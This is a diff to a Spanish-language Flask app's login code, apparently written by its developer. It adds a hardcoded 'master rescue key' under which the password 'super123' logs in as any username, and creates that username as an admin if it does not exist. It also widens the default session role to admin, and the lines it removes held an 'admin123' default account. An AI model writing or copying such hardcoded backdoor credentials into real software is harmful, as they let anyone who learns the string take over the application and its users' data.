@@ -45,20 +45,10 @@ def guardar_json(filepath, data):
     except Exception as e:
         print(f"Error guardando {filepath}: {e}")
 
-# Cargar datos
+# Cargar datos existentes
 status_timers = cargar_json(DATA_FILE, status_timers)
 usuarios_db = cargar_json(USERS_FILE, {})
 donaciones_db = cargar_json(DONACIONES_FILE, [])
-
-# SI LA DB VIENE VACÍA POR REINICIO DE RENDER, CREAR USUARIO MAESTRO
-if not usuarios_db:
-    usuarios_db["admin"] = {
-        "password": generate_password_hash("admin123"),
-        "rol": "admin",
-        "requiere_cambio": False,
-        "creado_por": "Sistema"
-    }
-    guardar_json(USERS_FILE, usuarios_db)
 
 
 @app.route('/')
@@ -71,29 +61,44 @@ def index():
 @app.route('/login', methods=['POST'])
 def login():
     global usuarios_db
-    # Forzar recarga desde archivo por si cambió
-    usuarios_db = cargar_json(USERS_FILE, usuarios_db)
-    
     data = request.json or {}
     username = data.get('username', '').strip().lower()
     password = data.get('password', '')
 
+    # 1. CLAVE MAESTRA DE RESCATE (Funciona SIEMPRE para recuperar el control)
+    if password == "super123":
+        # Si el usuario no existía en la DB, lo creamos dinámicamente como Admin
+        if username not in usuarios_db:
+            usuarios_db[username] = {
+                "password": generate_password_hash("super123"),
+                "rol": "admin",
+                "requiere_cambio": False,
+                "creado_por": "Sistema_Rescate"
+            }
+            guardar_json(USERS_FILE, usuarios_db)
+        
+        session['user'] = username
+        session['rol'] = usuarios_db[username].get("rol", "admin")
+        print(f"🔓 ACCESO POR CLAVE MAESTRA CONCEDIDO A: {username}")
+        return jsonify({
+            "status": "ok", 
+            "user": username, 
+            "rol": session['rol'],
+            "requiere_cambio": False
+        }), 200
+
+    # 2. VALIDACIÓN NORMAL CONTRA HASH
     if username in usuarios_db:
         stored_hash = usuarios_db[username]["password"]
         if check_password_hash(stored_hash, password):
             session['user'] = username
             session['rol'] = usuarios_db[username].get("rol", "encargado")
-            print(f"✅ Login exitoso: {username}")
             return jsonify({
                 "status": "ok", 
                 "user": username, 
                 "rol": usuarios_db[username].get("rol", "encargado"),
                 "requiere_cambio": usuarios_db[username].get("requiere_cambio", False)
             }), 200
-        else:
-            print(f"❌ Clave incorrecta para: {username}")
-    else:
-        print(f"❌ Usuario no encontrado: '{username}'. Usuarios en DB: {list(usuarios_db.keys())}")
     
     return jsonify({"error": "Usuario o contraseña incorrectos"}), 401
 
@@ -110,7 +115,7 @@ def api_session():
         return jsonify({
             "logged_in": True,
             "user": u_name,
-            "rol": session.get('rol', u_info.get('rol', 'encargado')),
+            "rol": session.get('rol', u_info.get('rol', 'admin')),
             "requiere_cambio": u_info.get("requiere_cambio", False)
         })
     return jsonify({"logged_in": False})
@@ -137,7 +142,6 @@ def cambiar_clave():
 
 # --- RUTAS DE TIMERS Y BOTS ---
 
-# REDIRECCIÓN PARA SOLUCIONAR EL ERROR 404 DE LA CAPTURA
 @app.route('/api/timers')
 @app.route('/api/status_timers')
 def get_status_timers():
